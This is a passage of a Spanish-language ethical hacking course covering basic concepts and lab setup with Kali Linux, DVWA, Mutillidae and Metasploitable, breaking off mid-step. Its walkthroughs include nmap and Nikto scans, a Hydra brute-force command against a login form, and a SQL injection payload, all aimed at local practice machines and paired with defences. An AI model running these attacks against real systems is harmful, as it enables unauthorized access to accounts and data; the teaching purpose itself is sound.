| **Inicio**         | **atr√°s 12**                                | **Siguiente 14**                                    |
| ------------------ | ------------------------------------------- | --------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./7_12_Fundamentos_de_Criptografia.md) | [‚è©](./7_14_Inteligencia_para_la_Ciberseguridad.md) |

---

## **√çndice**

| Temario                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [859. Conceptos b√°sicos sobre hacking √©tico](#859-conceptos-b√°sicos-sobre-hacking-√©tico)                                                                                                         |
| [860. Vulnerabilidades](#860-vulnerabilidades)                                                                                                                                                   |
| [861. Amenazas y ataques comunes](#861-amenazas-y-ataques-comunes)                                                                                                                               |
| [862. Instalaci√≥n del entorno de pruebas Kali Linux](#862-instalaci√≥n-del-entorno-de-pruebas-kali-linux)                                                                                         |
| [863. Instalaci√≥n del entorno de pruebas Mutillidae](#863-instalaci√≥n-del-entorno-de-pruebas-mutillidae)                                                                                         |
| [864. Instalaci√≥n del entorno de pruebas Metaesplotaible](#864-instalaci√≥n-del-entorno-de-pruebas-metaesplotaible)                                                                               |
| [865. Pr√°ctica: Cross-Site-Scripting, command injection y directorio transversal](#865-pr√°ctica-cross-site-scripting-command-injection-y-directorio-transversal)                                 |
| [866. Fases del hacking](#866-fases-del-hacking)                                                                                                                                                 |
| [867. Tipos de hacking](#867-tipos-de-hacking)                                                                                                                                                   |
| [868. Pr√°ctica: Obteniendo informaci√≥n de fuentes abiertas con OSINT Framework y Google hacking](#868-pr√°ctica-obteniendo-informaci√≥n-de-fuentes-abiertas-con-osint-framework-y-google-hacking)  |
| [869. Pr√°ctica: Analizar un sitio web con Nikto y Spiderfoot](#869-pr√°ctica-analizar-un-sitio-web-con-nikto-y-spiderfoot)                                                                        |
| [870. ¬øEs necesario un hacking √©tico? Hacking √©tico como profesi√≥n](#870-es-necesario-un-hacking-√©tico-hacking-√©tico-como-profesi√≥n)                                                             |
| [871. Conceptos. ¬øqu√© es y qu√© no es pentesting?](#871-conceptos-qu√©-es-y-qu√©-no-es-pentesting)                                                                                                  |
| [872. Tipos de pentesting. Fase Pre-ataque](#872-tipos-de-pentesting-fase-pre-ataque)                                                                                                            |
| [873. Pr√°ctica: Buscando secretos en repositorios GIT](#873-pr√°ctica-buscando-secretos-en-repositorios-git)                                                                                      |
| [874. Introducci√≥n al escaneo de redes](#874-introducci√≥n-al-escaneo-de-redes)                                                                                                                   |
| [875. Pr√°ctica: Escaneo de redes con Nmap](#875-pr√°ctica-escaneo-de-redes-con-nmap)                                                                                                              |
| [876. Fase de Ataque. Testing de aplicaciones web con Burp suite](#876-fase-de-ataque-testing-de-aplicaciones-web-con-burp-suite)                                                                |
| [877. Pr√°ctica: Explotando vulnerabilidades en metasploitable](#877-pr√°ctica-explotando-vulnerabilidades-en-metasploitable)                                                                      |
| [878. Fase Post-ataque. Metodolog√≠as](#878-fase-post-ataque-metodolog√≠as)                                                                                                                        |
| [879. Gesti√≥n de riesgos y modelado de amenazas](#879-gesti√≥n-de-riesgos-y-modelado-de-amenazas)                                                                                                 |
| [880. PCI DSS. HIPAA. DMCA.ISO/IEC 27001](#880-pci-dss-hipaa-dmcaisoiec-27001)                                                                                                                   |
| [881. Contratos, Reglas de compromisos, Cl√°usula de no competencia y Acuerdo de confidencialidad](#881-contratos-reglas-de-compromisos-cl√°usula-de-no-competencia-y-acuerdo-de-confidencialidad) |
| [882. Convenio de Budapest. ¬øC√≥mo vamos en Am√©rica latina? Salvaguarda de evidencias digitales](#882-convenio-de-budapest-c√≥mo-vamos-en-am√©rica-latina-salvaguarda-de-evidencias-digitales)      |
| [883. Malware y An√°lisis est√°tico de malware](#883-malware-y-an√°lisis-est√°tico-de-malware)                                                                                                       |
| [884. Malware y An√°lisis din√°mico de malware](#884-malware-y-an√°lisis-din√°mico-de-malware)                                                                                                       |
| [885. Sniffing y C√≥mo realizar un ataque Man in the middle automatico](#885-sniffing-y-c√≥mo-realizar-un-ataque-man-in-the-middle-automatico)                                                     |
| [886. Sniffing y C√≥mo realizar un ataque Man in the middle manual](#886-sniffing-y-c√≥mo-realizar-un-ataque-man-in-the-middle-manual)                                                             |
| [887. Denegaci√≥n de servicio. Ataque DOS con LOIC y HOIC](#887-denegaci√≥n-de-servicio-ataque-dos-con-loic-y-hoic)                                                                                |
| [888. Ingenier√≠a social](#888-ingenier√≠a-social)                                                                                                                                                 |
| [889. Pol√≠ticas de seguridad. Seguridad f√≠sica y Controles de acceso](#889-pol√≠ticas-de-seguridad-seguridad-f√≠sica-y-controles-de-acceso)                                                        |
| [890. Pr√°ctica: Bypass autenticaci√≥n QR (Reto 6 SANS Holiday hack)](#890-pr√°ctica-bypass-autenticaci√≥n-qr-reto-6-sans-holiday-hack)                                                              |
| [891. Copias de seguridad. Defensa en lo profundo](#891-copias-de-seguridad-defensa-en-lo-profundo)                                                                                              |
| [892. Pr√°ctica: instalaci√≥n del IDS snort](#892-pr√°ctica-instalaci√≥n-del-ids-snort)                                                                                                              |

# **Hacking √âtico**

## **859. Conceptos b√°sicos sobre hacking √©tico**

### üß† ¬øQu√© es el Hacking √âtico?

El **hacking √©tico** es el uso legal y autorizado de t√©cnicas de hacking para encontrar y corregir vulnerabilidades en sistemas inform√°ticos, redes, aplicaciones o servidores.

Es decir, un **hacker √©tico** piensa como un hacker malicioso, pero trabaja con **permiso**, con el objetivo de **proteger** en lugar de atacar.

---

### ‚úÖ Objetivos del Hacking √âtico

- Proteger redes y sistemas.
- Descubrir fallos de seguridad antes que los atacantes.
- Reforzar la ciberseguridad de empresas y personas.
- Cumplir normativas de seguridad como ISO 27001, NIST, etc.

---

### üë®‚Äçüíª Tipos de Hackers

| Tipo de Hacker                 | Descripci√≥n                                                                 |
| ------------------------------ | --------------------------------------------------------------------------- |
| üß¢ White Hat (Sombrero Blanco) | Hacker √©tico. Usa sus conocimientos para proteger.                          |
| üß¢ Black Hat (Sombrero Negro)  | Hacker malicioso. Ataca sin permiso.                                        |
| üß¢ Grey Hat (Sombrero Gris)    | Est√° en el medio. Puede hackear sin permiso, pero no con malas intenciones. |

---

### üß∞ Herramientas comunes del hacking √©tico

| Herramienta    | Funci√≥n                                                                       |
| -------------- | ----------------------------------------------------------------------------- |
| **Kali Linux** | Sistema operativo con herramientas preinstaladas para pruebas de penetraci√≥n. |
| **Nmap**       | Escaneo de redes y puertos.                                                   |
| **Metasploit** | Exploits y payloads para pruebas de vulnerabilidad.                           |
| **Wireshark**  | Analiza paquetes de red.                                                      |
| **Burp Suite** | Testeo de seguridad en aplicaciones web.                                      |

---

### üñ•Ô∏è ¬øC√≥mo instalar un entorno para practicar hacking √©tico?

#### Opci√≥n 1: Usar una m√°quina virtual con Kali Linux

1. **Instalar VirtualBox o VMware**:

   - Desc√°rgalo de: [https://www.virtualbox.org](https://www.virtualbox.org)

2. **Descargar la imagen de Kali Linux**:

   - Desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

3. **Importar la m√°quina virtual**:

   - Abre VirtualBox > Importa el archivo `.ova` que descargaste.

4. **Inicia Kali Linux**.

---

#### Opci√≥n 2: Usar Kali Linux desde USB

1. Descarga **Rufus**: [https://rufus.ie](https://rufus.ie)
2. Inserta tu USB.
3. Usa Rufus para "quemar" la imagen `.iso` de Kali.
4. Reinicia tu PC y arranca desde el USB.

> üîí **Recomendado**: Usa Kali Linux en una **m√°quina virtual** para no da√±ar tu sistema principal.

---

### üß™ Ejemplo completo de hacking √©tico b√°sico

#### üéØ Objetivo: Escanear una red local y encontrar qu√© dispositivos est√°n conectados.

---

#### Paso 1: Abrir Kali Linux

- Abre tu Kali Linux (ya sea en m√°quina virtual o USB).

---

#### Paso 2: Descubrir tu IP y red local

```bash
ip a
```

Busca algo como:

```
inet 192.168.1.100/24
```

Tu red es `192.168.1.0/24`.

---

#### Paso 3: Escanear todos los dispositivos conectados a tu red

```bash
nmap -sn 192.168.1.0/24
```

Esto escanea los hosts activos. Resultado t√≠pico:

```
Nmap scan report for 192.168.1.1 (Router)
Nmap scan report for 192.168.1.105 (Laptop)
Nmap scan report for 192.168.1.107 (Smartphone)
```

---

#### Paso 4: Escanear puertos de un dispositivo espec√≠fico

```bash
nmap -sV 192.168.1.105
```

Resultado:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6
80/tcp   open  http       Apache httpd 2.4.29
```

Ya sabes qu√© servicios corren en esa m√°quina.

---

#### Paso 5 (opcional): Usar Nikto para escanear vulnerabilidades en el servidor web

```bash
nikto -h http://192.168.1.105
```

---

### üß† Conclusiones del ejemplo

- Usaste **Nmap** para descubrir la red y los puertos abiertos.
- Usaste **Nikto** para buscar vulnerabilidades b√°sicas.
- Todo fue hecho de forma **√©tica** y en una red que t√∫ controlas.

---

### ‚ö†Ô∏è Importante sobre la √©tica

Nunca hagas pruebas de hacking en redes o sistemas ajenos sin permiso. Solo practica en:

- Tu propia red.
- Laboratorios virtuales (como TryHackMe, Hack The Box).
- Ambientes controlados.

---

### üìö Recomendaciones para seguir aprendiendo

- Cursos gratuitos: [TryHackMe](https://tryhackme.com), [Hack The Box](https://hackthebox.com)
- Libros:

  - ‚ÄúHacking √âtico 101‚Äù
  - ‚ÄúThe Web Application Hacker‚Äôs Handbook‚Äù

- Certificaciones:

  - CEH (Certified Ethical Hacker)
  - OSCP (Offensive Security Certified Professional)

---

[üîº](#√≠ndice)

---

## **860. Vulnerabilidades**

### üß† ¬øQu√© es una Vulnerabilidad?

Una **vulnerabilidad** es una **debilidad o fallo** en un sistema, software, aplicaci√≥n o red que puede ser aprovechado por un atacante para realizar una acci√≥n maliciosa, como robar datos, obtener acceso no autorizado, interrumpir el servicio, etc.

---

### üéØ Tipos comunes de vulnerabilidades

| Tipo                           | Explicaci√≥n simple                        | Ejemplo                                                 |
| ------------------------------ | ----------------------------------------- | ------------------------------------------------------- |
| **Vulnerabilidad de software** | Fallo en un programa o sistema operativo. | Windows sin parches de seguridad.                       |
| **Vulnerabilidad web**         | Fallo en sitios web o apps web.           | Inyecci√≥n SQL, XSS, etc.                                |
| **Vulnerabilidad de red**      | Mala configuraci√≥n o puertos abiertos.    | Router sin contrase√±a o con Telnet activado.            |
| **Errores humanos**            | Errores de configuraci√≥n o descuido.      | Contrase√±a "123456" o administrador sin cambiar claves. |

---

### üß∞ Herramientas para encontrar vulnerabilidades

| Herramienta                 | ¬øPara qu√© sirve?                               |
| --------------------------- | ---------------------------------------------- |
| **Nmap**                    | Escanear redes y servicios abiertos.           |
| **Nikto**                   | Buscar vulnerabilidades en servidores web.     |
| **OWASP ZAP**               | Analizar seguridad en aplicaciones web.        |
| **Burp Suite**              | Interceptar tr√°fico web para encontrar fallos. |
| **OpenVAS** o **Greenbone** | Escaneo de vulnerabilidades general.           |
| **Metasploit**              | Explotar vulnerabilidades conocidas.           |

---

### üß± ¬øC√≥mo instalar un entorno para probar vulnerabilidades?

#### ‚úÖ Lo que necesitas:

1. **Kali Linux** como atacante.
2. **M√°quina vulnerable**, por ejemplo:

   - [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)
   - [Metasploitable2](https://sourceforge.net/projects/metasploitable/)

---

#### üñ•Ô∏è Instalaci√≥n en M√°quina Virtual

##### Paso 1: Instala VirtualBox o VMware

- [https://www.virtualbox.org/](https://www.virtualbox.org)

##### Paso 2: Descarga Kali Linux (atacante)

- [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

##### Paso 3: Descarga Metasploitable2 (v√≠ctima)

- [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

##### Paso 4: Ejecuta ambas m√°quinas virtuales

Aseg√∫rate de que **ambas est√°n en la misma red interna o adaptador puente**.

---

### üîç Ejemplo completo: Encontrar vulnerabilidades en una web con Nikto

#### üéØ Objetivo: Escanear una aplicaci√≥n web vulnerable con Nikto

---

##### Paso 1: Enciende Metasploitable2

Anota la IP con:

```bash
ifconfig
```

Resultado (por ejemplo):

```
inet addr:192.168.1.105
```

---

#### Paso 2: Enciende Kali Linux y abre terminal

Ejecuta:

```bash
nikto -h http://192.168.1.105
```

---

#### Resultado t√≠pico:

```
+ Server: Apache/2.2.8 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /phpinfo.php: PHP info file found. This file may expose sensitive information.
+ OSVDB-3268: /icons/: Directory indexing is enabled.
```

---

#### ¬øQu√© significa esto?

- `phpinfo.php`: expone informaci√≥n del servidor.
- `TRACE`: m√©todo inseguro activo.
- `Directory indexing`: usuarios pueden ver archivos internos.

---

#### Paso 3 (opcional): Explotar una vulnerabilidad

Por ejemplo, puedes acceder a:

```bash
http://192.168.1.105/phpinfo.php
```

Y ver toda la configuraci√≥n del servidor (peligroso si es p√∫blico).

---

### üß† Conclusiones

- Las **vulnerabilidades** son errores que se pueden **detectar y corregir**.
- Puedes encontrarlas con herramientas como **Nikto**, **Nmap**, **Burp Suite**.
- Usar un **laboratorio virtual** como Metasploitable2 + Kali te permite **practicar sin da√±ar sistemas reales**.

---

### üìö Recomendaciones para seguir aprendiendo

- üîó [https://owasp.org](https://owasp.org): gu√≠a oficial sobre vulnerabilidades web.
- üìò Curso gratuito en [TryHackMe](https://tryhackme.com)
- üí° Aprender sobre CVE (Common Vulnerabilities and Exposures): [https://cve.mitre.org/](https://cve.mitre.org/)

---

[üîº](#√≠ndice)

---

## **861. Amenazas y ataques comunes**

### üîê ¬øQu√© es una amenaza en ciberseguridad?

Una **amenaza** es **todo aquello que puede poner en riesgo la seguridad de un sistema**, red, aplicaci√≥n o usuario.

> ‚ö†Ô∏è **No es lo mismo que un ataque**:
>
> - **Amenaza** = posibilidad de da√±o.
> - **Ataque** = acci√≥n concreta que aprovecha una vulnerabilidad.

---

### üß† Tipos de amenazas

| Tipo           | Explicaci√≥n sencilla                    | Ejemplo                             |
| -------------- | --------------------------------------- | ----------------------------------- |
| **Humanas**    | Errores o malas pr√°cticas de usuarios.  | Compartir contrase√±as por WhatsApp. |
| **Maliciosas** | Intenciones maliciosas de atacantes.    | Hacker intenta robar contrase√±as.   |
| **Naturales**  | Sucesos naturales que afectan sistemas. | Terremoto que da√±a un servidor.     |

---

### üõ†Ô∏è Tipos de ataques comunes

| Ataque                         | Qu√© hace                                  | Ejemplo sencillo                                               |
| ------------------------------ | ----------------------------------------- | -------------------------------------------------------------- |
| **Phishing**                   | Enga√±a al usuario para robar informaci√≥n. | Te llega un correo falso del banco.                            |
| **Malware**                    | C√≥digo malicioso que infecta el sistema.  | Abres un archivo adjunto infectado.                            |
| **Ransomware**                 | Secuestra archivos y pide rescate.        | Bloquea tus fotos y te pide dinero.                            |
| **DDoS**                       | Satura un servidor con muchas peticiones. | Un sitio se cae porque lo atacan con miles de accesos.         |
| **SQL Injection**              | Inserta c√≥digo malicioso en formularios.  | El atacante roba datos desde un campo de login.                |
| **XSS (Cross-site Scripting)** | Inserta scripts en p√°ginas web.           | Alguien escribe un `<script>` en un formulario y roba cookies. |
| **Brute Force**                | Prueba miles de combinaciones de claves.  | El atacante intenta acceder a una cuenta probando contrase√±as. |
| **Man-in-the-Middle (MITM)**   | Intercepta comunicaci√≥n entre dos partes. | Te conectas a un Wi-Fi p√∫blico y te roban la contrase√±a.       |

---

### üß∞ ¬øC√≥mo instalar un entorno para aprender sobre ataques?

La mejor forma es con **laboratorios virtuales controlados**.

#### ‚úÖ Opci√≥n segura: Usar m√°quinas virtuales en tu PC

#### Necesitas:

1. **VirtualBox o VMware** (para correr m√°quinas virtuales)

   - [https://www.virtualbox.org/](https://www.virtualbox.org/)

2. **Kali Linux** (para simular al atacante)

   - [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

3. **DVWA (Damn Vulnerable Web Application)** o **Metasploitable2** (para simular la v√≠ctima)

   - [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
   - [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

4. Colocar ambas m√°quinas virtuales en la **misma red interna**.

---

### üíª Ejemplo completo y pr√°ctico: Simulaci√≥n de un ataque de fuerza bruta

#### üéØ Objetivo: Usar **Hydra** (en Kali) para probar acceso con m√∫ltiples contrase√±as a una web vulnerable (**DVWA**).

---

#### Paso 1: Iniciar Kali Linux (atacante) y DVWA (v√≠ctima)

DVWA debe estar accesible desde Kali, por ejemplo en:

```
http://192.168.1.105/dvwa/login.php
```

---

#### Paso 2: Aseg√∫rate de que DVWA est√© en modo "LOW" de seguridad

Ve a la p√°gina DVWA ‚ûú "DVWA Security" ‚ûú selecciona `Low`.

---

#### Paso 3: Crear un archivo con contrase√±as comunes

```bash
echo -e "admin\n123456\npassword\ntest\nadmin123" > passwords.txt
```

---

#### Paso 4: Usar Hydra para hacer el ataque de fuerza bruta

```bash
hydra -l admin -P passwords.txt 192.168.1.105 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

#### Resultado esperado:

```
[80][http-post-form] host: 192.168.1.105   login: admin   password: password
```

> Esto significa que encontr√≥ una contrase√±a v√°lida (`password`) para el usuario `admin`.

---

### üß† ¬øQu√© aprendiste con este ejemplo?

- Simulaste un ataque real de fuerza bruta **sin da√±ar a nadie**.
- Usaste herramientas reales como **Hydra** y **DVWA**.
- Entendiste c√≥mo un atacante puede probar miles de contrase√±as.

---

### üõ°Ô∏è ¬øC√≥mo protegerte de estos ataques?

| Ataque        | Defensa recomendada                               |
| ------------- | ------------------------------------------------- |
| Phishing      | No hacer clic en correos sospechosos.             |
| Malware       | Usar antivirus y no abrir adjuntos desconocidos.  |
| Brute Force   | Usar contrase√±as fuertes y l√≠mites de intentos.   |
| SQL Injection | Validar entradas y usar consultas preparadas.     |
| DDoS          | Usar firewalls, balanceadores y mitigadores.      |
| XSS           | Escapar y sanitizar entradas en formularios.      |
| MITM          | Usar HTTPS y evitar redes Wi-Fi p√∫blicas sin VPN. |

---

### üìö Recursos gratuitos para practicar ataques y defensas

- üîó [https://tryhackme.com](https://tryhackme.com) (gu√≠a paso a paso para principiantes)
- üîó [https://owasp.org](https://owasp.org) (proyectos de seguridad web)
- üîó [https://hackthebox.com](https://hackthebox.com) (retos t√©cnicos con m√°quinas reales)

---

[üîº](#√≠ndice)

---

## **862. Instalaci√≥n del entorno de pruebas Kali Linux**

### üß† **¬øQu√© es Kali Linux?**

**Kali Linux** es un sistema operativo basado en Linux, especialmente dise√±ado para **hacking √©tico, pruebas de penetraci√≥n y an√°lisis forense**. Viene con **m√°s de 600 herramientas de ciberseguridad** preinstaladas como Nmap, Metasploit, Burp Suite, Wireshark, John the Ripper, entre otras.

> üîê Es una de las distribuciones m√°s usadas por **hackers √©ticos, pentesters y expertos en ciberseguridad.**

---

### ‚úÖ ¬øPor qu√© usar Kali Linux para pruebas?

- Tiene herramientas profesionales listas para usar.
- Es gratuito y de c√≥digo abierto.
- Lo puedes instalar en una m√°quina virtual, USB o como sistema principal.
- Ideal para **laboratorios de pr√°ctica sin afectar tu sistema principal.**

---

### üõ†Ô∏è ¬øC√≥mo instalar Kali Linux en tu PC paso a paso?

Te mostrar√© la forma **m√°s segura y recomendada**: **instalaci√≥n en m√°quina virtual** usando **VirtualBox**.

---

### üß∞ Requisitos previos

| Requisito        | Detalles                                       |
| ---------------- | ---------------------------------------------- |
| Sistema          | Windows, macOS o Linux                         |
| RAM              | M√≠nimo 4 GB (recomendado: 8 GB)                |
| Espacio en disco | M√≠nimo 20 GB libres                            |
| VirtualBox       | Para ejecutar Kali sin instalarlo directamente |

---

### üß± PASO 1: Instalar VirtualBox

1. Ve a: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Descarga la versi√≥n para tu sistema operativo.
3. Instala como cualquier otro programa (siguiente ‚ûú siguiente ‚ûú instalar).

---

### üß± PASO 2: Descargar Kali Linux

1. Ve a: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Haz scroll hasta **‚ÄúVirtual Machines‚Äù**.
3. Elige el archivo **OVA (formato listo para VirtualBox)**.
4. Desc√°rgalo (pesa alrededor de 3 GB).

> Ejemplo: `kali-linux-2025.1-virtualbox-amd64.ova`

---

### üß± PASO 3: Importar Kali Linux a VirtualBox

1. Abre **VirtualBox**.
2. Ve a **Archivo ‚ûú Importar servicio virtualizado**.
3. Selecciona el archivo `.ova` que descargaste.
4. Dale a ‚ÄúSiguiente‚Äù y luego ‚ÄúImportar‚Äù.
5. Espera unos minutos mientras se configura.

---

### üß± PASO 4: Iniciar Kali Linux

1. Haz clic en la m√°quina virtual importada.
2. Presiona **Iniciar**.
3. Aparecer√° Kali Linux ya instalado y funcionando.

> üßë‚Äçüíª Usuario y contrase√±a por defecto:
>
> - Usuario: `kali`
> - Contrase√±a: `kali`

---

### ‚úÖ Kali Linux ya est√° listo

Ahora puedes comenzar a usar herramientas como:

- **Nmap**: escaneo de red.
- **Burp Suite**: pruebas web.
- **Metasploit**: explotaci√≥n de vulnerabilidades.
- **Wireshark**: an√°lisis de tr√°fico de red.

---

### üì¶ EJEMPLO COMPLETO DE USO: Escanear dispositivos en tu red con Nmap

üéØ Objetivo: Detectar qu√© dispositivos est√°n conectados a tu red y qu√© puertos tienen abiertos.

---

#### Paso 1: Abrir una terminal en Kali

Presiona `Ctrl + Alt + T` o haz clic en el icono de la terminal.

---

#### Paso 2: Ver tu direcci√≥n IP y rango de red

Escribe:

```bash
ip a
```

Ejemplo de salida:

```
inet 192.168.1.100/24
```

Tu red es `192.168.1.0/24`.

---

#### Paso 3: Escanear todos los dispositivos conectados

```bash
nmap -sn 192.168.1.0/24
```

Este comando detecta todos los dispositivos activos en tu red.

---

#### Resultado esperado:

```
Nmap scan report for 192.168.1.1 (Router)
Nmap scan report for 192.168.1.101 (Laptop)
Nmap scan report for 192.168.1.105 (Smartphone)
```

---

#### Paso 4: Escanear los puertos abiertos de un dispositivo

```bash
nmap -sV 192.168.1.101
```

Ejemplo de salida:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2
80/tcp   open  http       Apache 2.4.46
```

> üîç Significa que ese dispositivo tiene un servidor web (puerto 80) y SSH (puerto 22) funcionando.

---

### ‚úÖ Conclusiones

- Instalaste Kali Linux en VirtualBox de forma **segura y aislada**.
- Usaste Nmap para hacer tu **primer an√°lisis de red real**.
- Est√°s listo para empezar a probar otras herramientas como **Burp Suite**, **Metasploit**, **Hydra**, etc.

---

### üìö Recursos adicionales para aprender con Kali

- üåê [https://tryhackme.com](https://tryhackme.com)
- üìò Curso gratuito: "Kali Linux for Beginners" (YouTube y Udemy)
- üîó [https://www.kali.org/docs/](https://www.kali.org/docs/): documentaci√≥n oficial

---

[üîº](#√≠ndice)

---

## **863. Instalaci√≥n del entorno de pruebas Mutillidae**

### üß† ¬øQu√© es Mutillidae?

**Mutillidae** (o _OWASP Mutillidae II_) es una **aplicaci√≥n web vulnerable intencionalmente**, creada para que los estudiantes, testers y profesionales de ciberseguridad puedan practicar ataques reales en un entorno seguro.

Fue desarrollada por OWASP y contiene decenas de vulnerabilidades web como:

- Inyecci√≥n SQL (SQLi)
- Cross-site scripting (XSS)
- CSRF
- Subida insegura de archivos
- Inyecciones de comandos
- y muchas m√°s...

> ‚úÖ Ideal para practicar con herramientas como **Burp Suite**, **OWASP ZAP**, **SQLmap**, **Hydra**, etc.

---

### üß∞ ¬øQu√© necesito para instalar Mutillidae?

Tienes 3 formas de usar Mutillidae:

1. üêß En **Kali Linux o cualquier Linux con Apache + PHP + MySQL**
2. ü™ü En Windows usando **XAMPP** (servidor web local)
3. ‚öôÔ∏è Como **m√°quina virtual preconfigurada (OWASP BWA)**

Vamos a usar la m√°s flexible y educativa: **Instalarlo manualmente en Kali Linux**, que ya conoces y usas.

---

### ‚úÖ Instalaci√≥n de Mutillidae en Kali Linux

#### üîπ PASO 1: Instala Apache, PHP y MariaDB (MySQL)

Abre terminal y ejecuta:

```bash
sudo apt update
sudo apt install apache2 php php-mysqli mariadb-server git -y
```

---

#### üîπ PASO 2: Clona el repositorio oficial de Mutillidae

```bash
cd /var/www/html
sudo git clone https://github.com/webpwnized/mutillidae.git
```

Renombra la carpeta (opcional):

```bash
sudo mv mutillidae mutillidae
```

---

#### üîπ PASO 3: Configura permisos de archivos

```bash
sudo chown -R www-data:www-data /var/www/html/mutillidae
```

---

#### üîπ PASO 4: Inicia los servicios necesarios

```bash
sudo systemctl start apache2
sudo systemctl start mariadb
```

---

#### üîπ PASO 5: Configura la base de datos de Mutillidae

1. Ingresa a MySQL:

```bash
sudo mysql -u root
```

2. Ejecuta lo siguiente (para crear la base de datos):

```sql
CREATE DATABASE mutillidae;
exit;
```

3. Ahora ve a tu navegador en Kali y abre:

```
http://localhost/mutillidae
```

4. Ver√°s la interfaz de Mutillidae. Haz clic en **"Setup/reset the DB"** para crear las tablas.

---

üéâ ¬°Listo! Ya tienes **Mutillidae instalado y funcionando**.

---

#### üö® Usuario y contrase√±a

Mutillidae no tiene login por defecto, pero **las credenciales se simulan dentro del laboratorio** (puedes ver usuarios en las tablas como `accounts`).

---

### üß™ EJEMPLO COMPLETO: Ataque de Inyecci√≥n SQL (SQLi)

üéØ Objetivo: Usar **una vulnerabilidad SQL** para obtener los nombres de usuarios.

---

#### Paso 1: Accede a Mutillidae

Navega a:

```
http://localhost/mutillidae
```

En el men√∫ izquierdo, busca:

```
OWASP Top 10 ‚ûú A1 - Injection ‚ûú SQL Injection ‚ûú User Info
```

---

#### Paso 2: Ejecuta un ataque SQLi b√°sico

En el campo "User ID", escribe:

```
1' OR '1'='1
```

Haz clic en "Submit".

---

#### Resultado esperado:

El sistema te devolver√° **todos los usuarios** en lugar de solo uno. Esto se debe a que el sistema **no valida correctamente el input** y el c√≥digo SQL queda as√≠:

```sql
SELECT * FROM users WHERE id='1' OR '1'='1';
```

Esto siempre es verdadero (`'1'='1'`), por lo tanto te muestra todos los registros.

---

### üß† ¬øQu√© aprendiste?

- C√≥mo instalar **Mutillidae** desde cero.
- Qu√© es una **inyecci√≥n SQL**.
- C√≥mo una simple entrada puede vulnerar toda la base de datos si no se valida correctamente.

---

### üõ°Ô∏è ¬øC√≥mo se defiende?

- Usando **consultas preparadas (prepared statements)**.
- Validando correctamente todos los datos que ingresan los usuarios.
- Aplicando **principios OWASP**.

---

### üìö Recursos recomendados

| Recurso           | Enlace                                                                               |
| ----------------- | ------------------------------------------------------------------------------------ |
| Mutillidae GitHub | [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae) |
| OWASP Top 10      | [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)     |
| Pr√°ctica guiada   | [https://tryhackme.com](https://tryhackme.com)                                       |

---

[üîº](#√≠ndice)

---

## **864. Instalaci√≥n del entorno de pruebas Metaesplotaible**

### üß† ¬øQu√© es Metasploitable?

**Metasploitable** es una m√°quina virtual vulnerable creada intencionalmente para que puedas practicar ataques con herramientas como **Metasploit**, **Nmap**, **Nikto**, **Hydra**, etc., de forma **legal y segura**.

> ‚ö†Ô∏è **No es una herramienta para ataques reales**, sino un entorno controlado para que aprendas hacking √©tico.

La versi√≥n m√°s usada es **Metasploitable2**, desarrollada por Rapid7 (creadores de Metasploit).

---

### ‚úÖ ¬øPor qu√© usar Metasploitable?

- Viene con m√∫ltiples servicios y vulnerabilidades abiertas.
- Perfecto para aprender inyecciones SQL, RCE (ejecuci√≥n remota de comandos), contrase√±as d√©biles, etc.
- F√°cil de integrar con Kali Linux.

---

### üß∞ Requisitos

| Requisito       | Detalles                                           |
| --------------- | -------------------------------------------------- |
| PC con al menos | 4 GB de RAM (recomendado 8 GB)                     |
| Espacio libre   | \~20 GB                                            |
| Programas       | VirtualBox (o VMware), Kali Linux, Metasploitable2 |

---

### ‚úÖ Instalaci√≥n paso a paso

#### üîπ Paso 1: Descargar VirtualBox

1. Ve a: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Descarga e instala VirtualBox seg√∫n tu sistema (Windows/macOS/Linux).

---

#### üîπ Paso 2: Descargar Kali Linux (opcional si ya lo tienes)

- P√°gina oficial: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- Puedes usar la versi√≥n en formato `.ova` (f√°cil de importar).

---

#### üîπ Paso 3: Descargar Metasploitable2

1. Ve a:
   [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
2. Descarga el archivo ZIP y descompr√≠melo. Deber√≠as obtener archivos como:

   - `Metasploitable.vmdk`
   - `Metasploitable.vmx`

---

#### üîπ Paso 4: Crear una m√°quina virtual para Metasploitable

En VirtualBox:

1. Clic en **"Nueva"**.
2. Nombre: `Metasploitable2`
3. Tipo: **Linux**
4. Versi√≥n: **Ubuntu (32-bit)**
5. RAM: al menos 512 MB
6. Disco duro: elige ‚Äúusar un disco existente‚Äù y selecciona `Metasploitable.vmdk`.

---

#### üîπ Paso 5: Configura red en ambas m√°quinas (Kali y Metasploitable)

Para que Kali pueda atacar a Metasploitable, deben estar en la **misma red**:

1. Ve a **Configuraci√≥n ‚ûú Red**
2. Elige **Adaptador puente** o **Red interna** en ambas m√°quinas.

   - Adaptador puente: ambas usan la red real de tu casa.
   - Red interna: red cerrada entre ambas m√°quinas.

---

#### üîπ Paso 6: Inicia Kali y Metasploitable

- Kali: usuario/contrase√±a suele ser `kali/kali`.
- Metasploitable: usuario `msfadmin`, contrase√±a `msfadmin`.

---

#### üîπ Paso 7: Verifica que ambas m√°quinas se ven

